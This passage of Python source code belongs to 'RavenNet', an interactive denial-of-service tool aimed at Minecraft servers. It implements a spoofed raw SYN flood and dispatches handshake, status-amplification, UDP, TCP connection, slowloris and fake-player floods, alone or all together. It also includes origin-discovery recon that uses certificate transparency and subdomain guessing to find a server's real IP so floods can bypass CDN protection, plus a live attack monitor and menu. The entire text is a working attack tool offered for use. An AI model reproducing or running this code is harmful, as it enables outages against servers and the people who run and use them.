                            frame_body = payload
                        w.write(varint_encode(len(frame_body)) + frame_body)
                        await w.drain()
                    elif pid == 0x00:
                        break
            except Exception:
                pass
            finally:
                try: w.close()
                except Exception: pass

    async def flusher(acc):
        while not stop.is_set():
            await asyncio.sleep(1)
            if acc[0]:
                cnt.add(acc[0], acc[1])
                acc[0] = 0; acc[1] = 0

    async def amain():
        acc = [0, 0]
        sem = asyncio.Semaphore(slots)
        tasks = [asyncio.create_task(flusher(acc))]
        while not stop.is_set():
            active = [t for t in tasks if not t.done()]
            if len(active) < slots * 2:
                for _ in range(slots * 2 - len(active)):
                    active.append(asyncio.create_task(handle(sem, acc)))
                tasks = active
            await asyncio.sleep(0.05)
        for t in tasks:
            t.cancel()
        if acc[0]:
            cnt.add(acc[0], acc[1])

    asyncio.run(amain())

# ── RAW SYN FLOOD (IPv4, root) ───────────────────────────────
def checksum(data):
    if len(data) % 2: data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def build_syn_packet(src_b, dst_b, sport, dport, seq):
    iph = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 40, 0x1234, 0x4000, 64, 6, 0, src_b, dst_b)
    tcph = struct.pack('!HHLLBBHHH', sport, dport, seq, 0, 0x50 | 0x02, 1024, 0, 0)
    pseudo = src_b + dst_b + struct.pack('!BBH', 0, 6, len(tcph))
    tcph = tcph[:16] + struct.pack('!H', checksum(pseudo + tcph)) + tcph[18:]
    iph = iph[:10] + struct.pack('!H', checksum(iph)) + iph[12:]
    return iph + tcph

def syn_flood_raw(ip, port, cfg, stop, cnt):
    if ':' in ip: return
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        return
    dst_b = socket.inet_aton(ip)
    lp = lb = 0
    while not stop.is_set():
        src = os.urandom(4)
        pkt = build_syn_packet(src, dst_b, random.randint(1024, 65535), port, random.getrandbits(32))
        try:
            s.sendto(pkt, (ip, 0))
            lp += 1; lb += len(pkt)
        except OSError:
            time.sleep(0.001)
        if lp >= 8192:
            cnt.add(lp, lb); lp = lb = 0
    cnt.add(lp, lb)

# ── WORKER DISPATCH ──────────────────────────────────────────
def worker_main(mode, ip, port, cfg, stop, cnt):
    cfg = dict(cfg); cfg['mode'] = mode
    if mode in ('handshake', 'status', 'connect'):
        handshake_epoll(ip, port, cfg, stop, cnt)
    elif mode == 'udp':
        udp_worker(ip, port, cfg, stop, cnt)
    elif mode == 'slowloris':
        slowloris_hold(ip, port, cfg, stop, cnt)
    elif mode == 'fake':
        fake_player_process(ip, port, cfg, stop, cnt)
    elif mode == 'syn':
        syn_flood_raw(ip, port, cfg, stop, cnt)

def spawn_farm(mode, ip, port, cfg, stop, cnt, count):
    procs = []
    for i in range(count):
        p = mp.Process(target=worker_main, args=(mode, ip, port, cfg, stop, cnt), daemon=True)
        p.start()
        procs.append(p)
        if os.name == 'posix' and hasattr(os, 'sched_setaffinity'):
            try: os.sched_setaffinity(p.pid, {i % os.cpu_count()})
            except Exception: pass
    return procs

# ── ORIGIN DISCOVERY / BYPASS RECON ──────────────────────────
SUB_WORDLIST = ["mc","play","build","hub","lobby","survival","network","server","origin","orig",
    "backend","sv","srv","pvp","skyblock","creative","fun","join","ip","direct","host","node",
    "panel","console","api","auth","test","dev","beta","eu","us","na","asia","cdn","proxy",
    "web","www","forums","shop","vote"]

def http_get_json(url, timeout=10):
    try:
        import urllib.request, ssl as _ssl
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = _ssl.CERT_NONE
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (RavenNet-recon)'})
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return json.loads(r.read().decode('utf-8', 'replace'))
    except Exception:
        return None

def resolve(host):
    try: return socket.gethostbyname(host)
    except Exception: return None

def resolve_target(host, port):
    try:
        infos = socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
        v4 = [i[4][0] for i in infos if i[0] == socket.AF_INET]
        v6 = [i[4][0] for i in infos if i[0] == socket.AF_INET6]
        return (v4[0] if v4 else (v6[0] if v6 else None)), v6
    except Exception:
        return None, []

def clean_motd(desc):
    if isinstance(desc, str): s = desc
    elif isinstance(desc, dict): s = desc.get('text','') or ''
    else: s = str(desc)
    return re.sub(r'[\u00a7§].', '', s).strip()

def motd_similarity(a, b):
    ta = set(re.findall(r'\w+', a.lower()))
    tb = set(re.findall(r'\w+', b.lower()))
    if not ta or not tb: return 0.0
    return len(ta & tb) / max(len(ta), len(tb))

def mc_banner(ip, port, timeout=4):
    try:
        s = socket.create_connection((ip, port), timeout)
        s.settimeout(timeout)
        s.sendall(build_status_request(port))
        read_varint_sock(s)
        read_varint_sock(s)
        slen = read_varint_sock(s)
        data = b''
        while len(data) < slen:
            chunk = s.recv(min(8192, slen - len(data)))
            if not chunk: break
            data += chunk
        s.close()
        return json.loads(data.decode('utf-8', 'replace'))
    except Exception:
        return None

def run_recon(host, port):
    clear()
    print(f"\n  {NEON_RED}{BOLD}⚡ ORIGIN DISCOVERY / CDN BYPASS{RESET}\n")
    log(f"Recon target: {host}:{port}", "RavenNet")
    primary, v6s = resolve_target(host, port)
    if not primary:
        log("Resolution failed!", "ERROR"); return
    log(f"Public address: {primary}" + (f" | IPv6: {', '.join(v6s)}" if v6s else ""), "INFO")
    ref = mc_banner(primary, port)
    ref_desc = clean_motd(ref.get('description')) if ref else ""
    if ref:
        log(f"MOTD: {ref_desc[:70]}", "RavenNet")
    log("Querying crt.sh certificate transparency...", "INFO")
    names = set()
    crt = http_get_json(f"https://crt.sh/?q=%25.{host}&output=json")
    if crt:
        for e in crt:
            for part in (e.get('name_value','') or '').split('\n'):
                part = part.strip().lstrip('*.').lower()
                if part and part.endswith(host) and part != host:
                    names.add(part)
    for w in SUB_WORDLIST:
        names.add(f"{w}.{host}")
    log(f"Probing {min(len(names), 400)} candidates...", "INFO")
    seen = {}; hits = []; deadline = time.time() + 90
    for name in sorted(names)[:400]:
        if time.time() > deadline: break
        ip = resolve(name)
        if not ip or ip in seen: continue
        seen[ip] = name
        b = mc_banner(ip, port)
        if not b: continue
        desc = clean_motd(b.get('description'))
        score = motd_similarity(ref_desc, desc) if ref_desc else 1.0
        fav = bool(ref and ref.get('favicon') and ref.get('favicon') == b.get('favicon'))
        if score > 0.35 or fav:
            hits.append((name, ip, score, fav, desc[:60]))
    clear()
    print(f"\n  {NEON_RED}{BOLD} ORIGIN DISCOVERY REPORT{RESET}\n")
    log(f"Reference MOTD: {ref_desc[:70]}", "INFO")
    print()
    if not hits:
        log("No strong origin match found.", "WARN")
        log("Next: Shodan/Censys  ->  search 'hostname:<domain> port:<port>' or paste MOTD as search string", "RavenNet")
        log("Next: mcsrvstat.us API ->  https://api.mcsrvstat.us/3/<host>", "RavenNet")
    else:
        print(f"  {BORDER}┌─ CANDIDATE ORIGINS ─────────────────────────────────────────────────────┐{RESET}")
        for name, ip, score, fav, desc in hits:
            tag = "  ★ ORIGIN " if fav else ("  ◈ STRONG " if score > 0.6 else "  ◇ PARTIAL ")
            col = GREEN if fav or score > 0.6 else AMBER
            print(f"  {BORDER}│{RESET}  {col}{tag}{RESET} {NEON_RED}{name}{RESET} -> {WHITE}{ip}{RESET}")
            print(f"  {BORDER}│{RESET}  {MUTED}score {score:.2f}  •  {desc}{RESET}")
        print(f"  {BORDER}└──────────────────────────────────────────────────────────────────────┘{RESET}")
        log("Flood these IPs directly to bypass the CDN/proxy edge.", "RavenNet")
    print()
    input(f"  {MUTED}Press Enter to return...{RESET}")

# ── MONITOR HUD (themed) ─────────────────────────────────────
def pulse_bar(value, max_val, width=28):
    if max_val <= 0: max_val = 1
    ratio = min(value / max_val, 1.0)
    filled = int(width * ratio)
    bar = "█" * filled + "░" * (width - filled)
    col = NEON_RED if ratio > 0.75 else (VIVID_RED if ratio > 0.4 else MID_RED)
    return f"{col}{bar}{RESET}"

def monitor_loop(stop, cnt, attack_name, target_str, start_time, peaks):
    last_p = last_b = 0
    last_t = time.time(); tick = 0
    pulses = ["◐", "◓", "◑", "◒"]
    while not stop.is_set():
        time.sleep(1)
        if stop.is_set(): break
        now = time.time()
        dt = max(now - last_t, 0.001)
        cp, cb = cnt.packets.value, cnt.bytes.value
        pps = (cp - last_p) / dt
        bps = (cb - last_b) / dt
        mbps = (bps * 8) / 1_000_000
        total_mb = cb / (1024 * 1024)
        peaks['pps'] = max(peaks.get('pps', 0), pps)
        peaks['mbps'] = max(peaks.get('mbps', 0), mbps)
        last_p, last_b, last_t = cp, cb, now
        tick += 1
        pulse = pulses[tick % len(pulses)]
        cp_s = f"{cp:,}"; pps_s = f"{pps:,.0f}"; pk_s = f"{peaks['pps']:,.0f}"
        mb_s = f"{mbps:.2f}"; pm_s = f"{peaks['mbps']:.2f}"
        clear()
        print(f"{BORDER}{BOLD}╔══════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{BORDER}║{RESET}   {NEON_RED}{BOLD}{pulse} THE RavenNet TOOL • LIVE FIRE • v4.0{RESET}          {BORDER}║{RESET}")
        print(f"{BORDER}╠══════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{BORDER}║{RESET}  {MUTED}TARGET  {RESET}{AMBER}{BOLD}{target_str.ljust(50)}{RESET}{BORDER}║{RESET}")
        print(f"{BORDER}║{RESET}  {MUTED}VECTOR  {RESET}{VIVID_RED}{attack_name.ljust(50)}{RESET}{BORDER}║{RESET}")
        print(f"{BORDER}║{RESET}  {MUTED}RUNTIME {RESET}{SILVER}{f'{int(now - start_time)}s'.ljust(50)}{RESET}{BORDER}║{RESET}")
        print(f"{BORDER}╠══════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{BORDER}║{RESET}  {MUTED}PACKETS {RESET}{GREEN}{BOLD}{cp_s.ljust(21)}{RESET} {MUTED}PEAK PPS {RESET}{GREEN}{pk_s.ljust(14)}{RESET}{BORDER}║{RESET}")
        print(f"{BORDER}║{RESET}  {MUTED}DATA    {RESET}{GREEN}{BOLD}{f'{total_mb:.2f} MB'.ljust(21)}{RESET} {MUTED}PEAK MBPS{RESET}{GREEN}{pm_s.ljust(14)}{RESET}{BORDER}║{RESET}")
        print(f"{BORDER}║{RESET}  {MUTED}RATE    {RESET}{AMBER}{BOLD}{pps_s.ljust(21)}{RESET} {MUTED}LIVE MBPS{RESET}{AMBER}{mb_s.ljust(14)}{RESET}{BORDER}║{RESET}")
        print(f"{BORDER}╠══════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{BORDER}║{RESET}  {MUTED}PPS  {RESET}{pulse_bar(pps, peaks['pps'])}  {WHITE}{pps_s.rjust(8)}{RESET}          {BORDER}║{RESET}")
        print(f"{BORDER}║{RESET}  {MUTED}MBPS {RESET}{pulse_bar(mbps, peaks['mbps'])}  {WHITE}{mb_s.rjust(8)}{RESET}          {BORDER}║{RESET}")
        if PSUTIL:
            cpu = psutil.cpu_percent(); mem = psutil.virtual_memory().percent
            cpu_s = f"{cpu:.1f}%"; mem_s = f"{mem:.1f}%"
            print(f"{BORDER}║{RESET}  {MUTED}CPU  {RESET}{pulse_bar(cpu, 100)}  {WHITE}{cpu_s.rjust(7)}{RESET}          {BORDER}║{RESET}")
            print(f"{BORDER}║{RESET}  {MUTED}RAM  {RESET}{pulse_bar(mem, 100)}  {WHITE}{mem_s.rjust(7)}{RESET}          {BORDER}║{RESET}")
        print(f"{BORDER}╠══════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{BORDER}║{RESET}  {MUTED}STATUS  {RESET}{NEON_RED}{BOLD}● ENGAGED{RESET}{''.ljust(41)}{BORDER}║{RESET}")
        print(f"{BORDER}║{RESET}  {MUTED}EXIT    {RESET}{GHOST}Ctrl+C to stop{RESET}{''.ljust(35)}{BORDER}║{RESET}")
        print(f"{BORDER}{BOLD}╚══════════════════════════════════════════════════════════════╝{RESET}")

# ── ENGAGEMENT FLOW ──────────────────────────────────────────
ATTACK_NAMES = {
    'handshake': "MC HANDSHAKE FLOOD (EPOLL)",
    'status':    "STATUS AMPLIFICATION (MOTD BOMB)",
    'fake':      "FAKE PLAYER HOLD (INVISIBLE)",
    'udp':       "UDP BANDWIDTH (sendmmsg)",
    'connect':   "TCP CONNECTION FLOOD",
    'slowloris': "SLOWLORIS HOLD",
    'syn':       "RAW SYN FLOOD (SPOOFED)",
    'full':      "FULL SPECTRUM OVERLOAD",
}

def launch_animation(vector_name, procs, concurrency):
    clear()
    print(f"\n  {NEON_RED}{BOLD} ARMING PAYLOAD{RESET}\n")
    log(f"Vector locked: {vector_name}", "RavenNet")
    log(f"Worker processes: {procs} | concurrency/worker: {concurrency}", "RavenNet")
    print()
    for i in range(3, 0, -1):
        sys.stdout.write(f"\r  {NEON_RED}{BOLD}▶{RESET} Launch in {AMBER}{BOLD}{i}{RESET}...   ")
        sys.stdout.flush(); time.sleep(0.6)
    sys.stdout.write(f"\r  {NEON_RED}{BOLD} FIRE!{RESET}              \n\n")
    time.sleep(0.3)

def run_engagement(target_display, port, mode, workers, concurrency, delay_ms, jitter):
    stop = mp.Event()
    cnt = Counters()
    peaks = {}
    start = time.time()

    primary, v6s = resolve_target(target_display, port)
    if not primary:
        log("Could not resolve target!", "ERROR")
        return
    target_str = f"{primary}:{port}"
    log(f"Resolved -> {target_str}", "INFO")

    if mode == 'syn' and ':' in primary:
        log("SYN flood is IPv4-only - target is IPv6. Aborting.", "ERROR")
        return

    cfg = {'concurrency': concurrency, 'delay_ms': delay_ms, 'jitter': jitter,
           'size': 1400, 'pool_size': 512, 'family': 4, 'protocol': 767}
    if ':' in primary:
        cfg['family'] = 6

    procs = []
    if mode == 'full':
        specs = [('status', max(1, workers // 3)),
                 ('handshake', max(1, workers // 4)),
                 ('udp', max(1, workers // 6)),
                 ('connect', max(1, workers // 8)),
                 ('slowloris', max(1, workers // 8)),
                 ('fake', 2)]
        if hasattr(os, 'geteuid') and os.geteuid() == 0:
            specs.append(('syn', max(1, workers // 8)))
        launch_animation(ATTACK_NAMES['full'], sum(w for _, w in specs), concurrency)
        for m, w in specs:
            procs += spawn_farm(m, primary, port, cfg, stop, cnt, w)
    else:
        launch_animation(ATTACK_NAMES[mode], workers, concurrency)
        procs = spawn_farm(mode, primary, port, cfg, stop, cnt, workers)

    if v6s and mode != 'syn':
        cfg6 = dict(cfg); cfg6['family'] = 6
        m6 = 'handshake' if mode == 'full' else mode
        procs += spawn_farm(m6, v6s[0], port, cfg6, stop, cnt, max(1, workers // 2))
        target_str += f"  +v6:{v6s[0]}"

    mon = threading.Thread(target=monitor_loop,
                           args=(stop, cnt, ATTACK_NAMES[mode], target_str, start, peaks),
                           daemon=True)
    mon.start()

    try:
        while not stop.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        log("Ctrl+C - terminating workers...", "WARN")
    finally:
        stop.set()
        time.sleep(0.5)
        for p in procs:
            try: p.terminate()
            except Exception: pass
        for p in procs:
            try: p.join(2)
            except Exception: pass
        clear()
        elapsed = max(time.time() - start, 0.001)
        cp, cb = cnt.packets.value, cnt.bytes.value
        avg = cp / elapsed
        print(f"{BORDER}{BOLD}╔══════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{BORDER}║{RESET}            {NEON_RED}{BOLD} THE RavenNet TOOL • MISSION REPORT{RESET}              {BORDER}║{RESET}")
        print(f"{BORDER}╠══════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{BORDER}║{RESET}  {AMBER}Target     {target_str}{RESET}")
        print(f"{BORDER}║{RESET}  {VIVID_RED}Vector     {ATTACK_NAMES[mode]}{RESET}")
        print(f"{BORDER}║{RESET}  {SILVER}Runtime    {elapsed:.1f}s{RESET}")
        print(f"{BORDER}║{RESET}  {GREEN}Packets    {cp:,}{RESET}")
        print(f"{BORDER}║{RESET}  {GREEN}Data       {cb / (1024 * 1024):.2f} MB{RESET}")
        print(f"{BORDER}║{RESET}  {AMBER}Average    {avg:,.0f} pps{RESET}")
        print(f"{BORDER}║{RESET}  {NEON_RED}Peak       {peaks.get('pps', 0):,.0f} pps  •  {peaks.get('mbps', 0):.2f} Mbps{RESET}")
        print(f"{BORDER}╠══════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{BORDER}║{RESET}  {GREEN}{BOLD}Status     ENGAGEMENT COMPLETE{RESET}")
        print(f"{BORDER}{BOLD}╚══════════════════════════════════════════════════════════════╝{RESET}")
        print()

# ── MENU (banner persists above the box) ─────────────────────
def menu_screen():
    clear()
    print_banner(skip_boot=True)
    print()
    print(f"{BORDER}╔══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BORDER}║{RESET}              {NEON_RED}{BOLD} THE RavenNet TOOL • v4.0{RESET}                       {BORDER}║{RESET}")
    print(f"{BORDER}╠══════════════════════════════════════════════════════════════╣{RESET}")
    print(f"{BORDER}║{RESET}  {VIVID_RED}[1]  MC Handshake Flood    (epoll engine){RESET}                   {BORDER}║{RESET}")
    print(f"{BORDER}║{RESET}  {VIVID_RED}[2]  Status Amplification  (MOTD/favicon bomb){RESET}              {BORDER}║{RESET}")
    print(f"{BORDER}║{RESET}  {VIVID_RED}[3]  Fake-Player Hold      (invisible to filters){RESET}           {BORDER}║{RESET}")
    print(f"{BORDER}║{RESET}  {VIVID_RED}[4]  UDP Bandwidth Flood   (sendmmsg batch){RESET}                 {BORDER}║{RESET}")
    print(f"{BORDER}║{RESET}  {VIVID_RED}[5]  TCP Connection Flood  (epoll){RESET}                          {BORDER}║{RESET}")
    print(f"{BORDER}║{RESET}  {VIVID_RED}[6]  Slowloris Hold        (partial frame){RESET}                  {BORDER}║{RESET}")
    print(f"{BORDER}║{RESET}  {VIVID_RED}[7]  Raw SYN Flood         (spoofed, ROOT){RESET}                  {BORDER}║{RESET}")
    print(f"{BORDER}║{RESET}  {VIVID_RED}{BOLD}[8]  FULL SPECTRUM        (all vectors){RESET}               {BORDER}║{RESET}")
    print(f"{BORDER}║{RESET}  {VIVID_RED}[9]  Origin Discovery     (CDN bypass recon){RESET}                {BORDER}║{RESET}")
    print(f"{BORDER}║{RESET}  {MUTED}[0]  Exit{RESET}{''.ljust(47)}         {BORDER}║{RESET}")
    print(f"{BORDER}╚══════════════════════════════════════════════════════════════╝{RESET}")
    return input(f"\n  {NEON_RED}Choice -> {RESET}").strip()

def main():
    sys.stdout.write(SHOW)
    print_banner()  # matrix rain + boot + glowing banner ONCE
    print(f"\n  {GHOST}engines: epoll | sendmmsg | raw-SYN | status-amp | fake-player | slowloris{RESET}\n")
    while True:
        choice = menu_screen()
        if choice == '0':
            print(f"\n  {ACCENT}✦ THE RavenNet TOOL standing by. ✦{RESET}\n")
            break
        if choice == '9':
            host = input(f"  {NEON_RED}IP / Domain -> {RESET}").strip()
            if not host:
                log("No host!", "WARN"); continue
            port = input(f"  {NEON_RED}Port -> {RESET}").strip() or "25565"
            try: port = int(port)
            except ValueError:
                log("Bad port!", "WARN"); continue
            run_recon(host, port)
            continue
        if choice not in ('1', '2', '3', '4', '5', '6', '7', '8'):
            log("Invalid choice!", "WARN")
            continue
        target = input(f"  {NEON_RED}IP / Domain -> {RESET}").strip()
        if not target:
            log("No target!", "ERROR")
            continue
        port = input(f"  {NEON_RED}Port -> {RESET}").strip() or "25565"
        try: port = int(port)
        except ValueError:
            log("Bad port!", "WARN"); continue
        workers = input(f"  {NEON_RED}Worker processes (def 8) -> {RESET}").strip() or "8"
        try: workers = min(max(int(workers), 1), 128)
        except ValueError: workers = 8
        conc = input(f"  {NEON_RED}Concurrency per worker (def 3000) -> {RESET}").strip() or "3000"
        try: conc = min(max(int(conc), 10), 100000)
        except ValueError: conc = 3000
        delay = input(f"  {NEON_RED}UDP delay ms (def 0) -> {RESET}").strip() or "0"
        try: delay = max(int(delay), 0)
        except ValueError: delay = 0
        jit = input(f"  {NEON_RED}Burst jitter mode? (y/N) -> {RESET}").strip().lower() == 'y'
        mode = {'1': 'handshake', '2': 'status', '3': 'fake', '4': 'udp',
                '5': 'connect', '6': 'slowloris', '7': 'syn', '8': 'full'}[choice]
        run_engagement(target, port, mode, workers, conc, delay, jit)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.stdout.write(SHOW)
        print(f"\n  {ACCENT}✦ Aborted. ✦{RESET}\n")
